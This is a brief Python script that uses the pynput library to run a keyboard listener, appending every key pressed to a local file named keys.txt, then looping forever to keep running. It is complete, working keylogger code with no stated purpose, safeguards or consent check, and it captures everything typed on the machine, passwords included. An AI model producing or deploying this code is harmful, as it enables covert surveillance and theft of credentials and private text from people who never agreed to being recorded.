from pynput import keyboard

# Create a text file to store the keys
with open('keys.txt', 'w') as f:
    pass

# Define a callback function to be called when a key is pressed
def on_key_press(key):
    # Print the key to the text file
    with open('keys.txt', 'a') as f:
        f.write(f"{key}\n")
    # print(f"{key} was pressed")

listener = keyboard.Listener(on_press=on_key_press)
listener.start()

while True:
    pass